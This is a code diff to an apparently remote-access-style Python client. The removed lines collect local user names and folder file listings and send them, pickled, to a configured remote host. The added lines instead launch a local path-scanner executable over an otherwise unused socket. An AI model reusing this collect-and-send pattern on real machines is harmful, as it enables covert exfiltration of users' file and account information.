@@ -32,24 +32,10 @@ def start_sendFiles(filedir: str):
         FileThread.join()
 
 
-def sendFolderData(fol: str):
-    global folder
-    users = getuser()
-    try:
-        #! This should seperate the folder name from the command
-        folder = fol.split('-')[2]
-        local_files = getfiles(users[1], f"{folder}")
-    except:
-        try:
-            local_files = getfiles(users[1], "Documents")
-        except:
-            local_files = getfiles(users[0], "Dokumenty")
-
+def sendFolderData():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as suck:
         suck.connect((CONN_HOST, CONN_PORT))
-        print("File transfer socket connected.")
-        suck.send(dumps(users))
-        suck.send(dumps(local_files)) # Server have to use loads(data) from pickle library
+        os.system("start Client_development/rust_programs/path_scanner/target/debug/path_scanner.exe");
     suck.close()
     print("Closed Folder Transfer socket.")
 
